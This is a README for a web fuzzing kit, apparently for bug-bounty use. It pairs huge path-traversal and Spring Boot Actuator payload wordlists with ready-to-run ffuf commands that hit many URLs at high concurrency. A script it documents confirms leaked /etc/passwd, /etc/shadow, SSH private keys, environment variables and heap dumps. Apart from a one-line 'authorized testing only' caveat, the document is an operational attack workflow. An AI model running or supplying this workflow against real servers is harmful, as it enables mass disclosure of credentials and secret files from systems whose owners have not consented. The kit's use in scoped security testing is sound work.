# Actuator + LFI Parameter Fuzzing Kit

Two files:

| File | What it is |
|------|-----------|
| `actuator_lfi_params.txt` | 290,314 unique `param=value` payloads — LFI / path-traversal (`/etc/passwd`, `/proc/version`, logs, SSH keys, `win.ini`, `.env`, `web.xml`) **and** Spring Boot Actuator endpoints (`/actuator/env`, `/env`, `/heapdump`, `/jolokia`, …). |
| `lfi_params.txt` | 193,488 unique `param=value` payloads — **LFI-only**, built from PayloadsAllTheThings, HackTricks, SecLists (Jhaddix) and public bug-bounty reports. Full bypass matrix: `../`, `....//`, `..////`, `..%2f`, `%2e%2e%2f`, double-encoded `%252e%252e%252f`, overlong UTF-8 `%c0%ae`, 16-bit `%c1%9c`, `/%5C..`, Windows `..\`, null-byte `%00`/`%2500`, path truncation, `php://filter` base64/rot13/iconv chains, `file://`/`expect://`/`zip://` wrappers. |
| `verify_hits.sh` | Re-fetches candidate URLs and confirms **true positives** by matching the response body against disclosure signatures — kills ffuf's 200-OK / soft-404 noise. |

The two wordlists are interchangeable in the ffuf command below — swap `actuator_lfi_params.txt` for `lfi_params.txt`. `verify_hits.sh` confirms hits from either.

> ⚠️ **Authorized testing only.** Use only against targets in a program scope or systems you own/have written permission to test.

---

## Requirements

- `ffuf` — https://github.com/ffuf/ffuf
- `bash`, `curl`, `xargs`, `grep` (standard on Linux/macOS/WSL)

---

## 1. Fuzz with ffuf

The wordlist entries are full `key=value` pairs, so `FUZZ` goes **after the `?`**.

### Single target

```bash
ffuf -u 'https://target.com/?FUZZ' \
     -w actuator_lfi_params.txt:FUZZ \
     -mc 200 -c -rate 50 -t 100 \
     -o ffuf_out.json -of json
```

### Many targets (your two-wordlist command)

Two `-w` flags need a mode. Use **clusterbomb** (every URL × every payload):

```bash
ffuf -u 'URL/?FUZZ' \
     -w urls.txt:URL \
     -w actuator_lfi_params.txt:FUZZ \
     -mode clusterbomb \
     -mc 200 -c -rate 50 -t 100 \
     -o ffuf_out.json -of json
```

Useful additions:
- `-mc all -fs 0` then filter yourself — actuator leaks sometimes return non-200.
- `-fw <N>` / `-fs <N>` to filter the baseline "not found" response by word/size.
- `-H 'Authorization: Bearer <token>'` for authenticated fuzzing.
- `-x http://127.0.0.1:8080` to route through Burp.

### Turn ffuf output into a URL list for step 2

```bash
# from JSON output
jq -r '.results[].url' ffuf_out.json > candidates.txt

# or skip JSON and capture matched URLs directly
ffuf -u 'https://target.com/?FUZZ' -w actuator_lfi_params.txt:FUZZ \
     -mc 200 -s > candidates.txt
```

`candidates.txt` = one full URL per line.

---

## 2. Confirm true positives

ffuf only knows the status code. `verify_hits.sh` fetches each URL and reports a hit **only when the body actually contains sensitive data** (e.g. `root:x:0:0:` for passwd, `Linux version` for `/proc/version`, `propertySources` for `/env`, HPROF magic for heapdump).

```bash
chmod +x verify_hits.sh
./verify_hits.sh -i candidates.txt -o confirmed.txt
```

### Options

| Flag | Meaning | Default |
|------|---------|---------|
| `-i FILE` | input URL list (one per line) — **required** | — |
| `-o FILE` | write confirmed hits to FILE | `confirmed_hits.txt` |
| `-t N` | concurrent workers | `30` |
| `-T N` | per-request timeout (s) | `10` |
| `-H HDR` | extra header, repeatable (e.g. auth) | — |
| `-x URL` | proxy (e.g. `http://127.0.0.1:8080`) | — |
| `-k` | ignore TLS cert errors | off |
| `-v` | also print `[miss]` lines | off |

### Examples

```bash
# authenticated, through Burp, ignore bad certs, 40 workers
./verify_hits.sh -i candidates.txt -o confirmed.txt \
    -H 'Authorization: Bearer eyJ...' \
    -x http://127.0.0.1:8080 -k -t 40

# verbose (see everything it checked)
./verify_hits.sh -i candidates.txt -v
```

### Output format

Terminal shows colored `[CONFIRMED] [status] SIGNATURE url`.
`confirmed.txt` is tab-separated for easy parsing:

```
200	LFI:/etc/passwd	https://target.com/?file=../../../../etc/passwd
200	ACTUATOR:/env	https://target.com/?path=/actuator/env
```

Parse it further, e.g. only actuator hits:

```bash
grep 'ACTUATOR' confirmed.txt | cut -f3
```

---

## Detection signatures (what counts as "confirmed")

**LFI:** `/etc/passwd` (`user:x:uid:gid:`), `/etc/shadow`, `/proc/version` (`Linux version`), `/proc/self/environ` (`PATH=…/bin`), Windows `[fonts]`/`win.ini`, SSH `BEGIN … PRIVATE KEY`, base64 source leak (php filter).

**Actuator:** `_links` index, `/env` (`propertySources`/`activeProfiles`), `/health` (`"status":"UP"`), `/beans`, `/mappings`, `/configprops`, `/metrics`, `/httptrace`, `/threaddump`, `/loggers`, `/heapdump` (HPROF magic), `jolokia`.

Add your own by editing the `check_one()` `if/elif` chain in `verify_hits.sh`.

---

## Verification status

- `bash -n verify_hits.sh` → no syntax errors.
- Functional test vs. a local mock server: confirmed `/etc/passwd`, `/proc/version`, actuator `/env` and `/health`; correctly **ignored** a 200-OK decoy page and a 404 — proving the noise filtering works.

---

## Suggested workflow

```
urls.txt ──ffuf──▶ candidates.txt ──verify_hits.sh──▶ confirmed.txt ──▶ report
```

1. Collect in-scope hosts into `urls.txt`.
2. Fuzz (step 1) → `candidates.txt`.
3. Verify (step 2) → `confirmed.txt`.
4. Manually validate each confirmed hit before reporting.
```
